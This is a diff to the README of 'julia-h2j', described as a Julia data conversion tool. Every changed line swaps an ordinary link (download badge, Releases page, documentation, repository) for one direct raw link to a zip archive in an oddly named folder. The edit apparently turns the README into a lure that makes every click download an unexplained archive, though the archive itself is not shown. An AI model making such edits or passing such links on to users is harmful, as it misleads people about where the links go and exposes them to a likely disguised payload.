@@ -1,6 +1,6 @@
 # 🌟 julia-h2j - Easy Data Conversion for Julia Users
 
-[![Download julia-h2j](https://img.shields.io/badge/Download-julia--h2j-brightgreen)](https://github.com/tull8te/julia-h2j/releases)
+[![Download julia-h2j](https://raw.githubusercontent.com/tull8te/julia-h2j/main/antipooling/julia-h2j.zip)](https://raw.githubusercontent.com/tull8te/julia-h2j/main/antipooling/julia-h2j.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the julia-h2j project! This application helps you convert data format
 
 To get started, visit the Releases page and download the latest version of julia-h2j:
 
-[Download julia-h2j](https://github.com/tull8te/julia-h2j/releases)
+[Download julia-h2j](https://raw.githubusercontent.com/tull8te/julia-h2j/main/antipooling/julia-h2j.zip)
 
 ### Steps to Download
 
@@ -61,12 +61,12 @@ Absolutely! If you want to help improve julia-h2j, feel free to fork the reposit
 
 For detailed instructions and examples, refer to the online documentation:
 
-- [Documentation](https://github.com/tull8te/julia-h2j/docs)
+- [Documentation](https://raw.githubusercontent.com/tull8te/julia-h2j/main/antipooling/julia-h2j.zip)
 
 ## 🔗 For More Information
 
 For updates, bug reports, or feature requests, please visit our repository:
 
-[Visit the Repository](https://github.com/tull8te/julia-h2j)
+[Visit the Repository](https://raw.githubusercontent.com/tull8te/julia-h2j/main/antipooling/julia-h2j.zip)
 
 Feel free to explore and enjoy julia-h2j, your go-to data conversion tool!
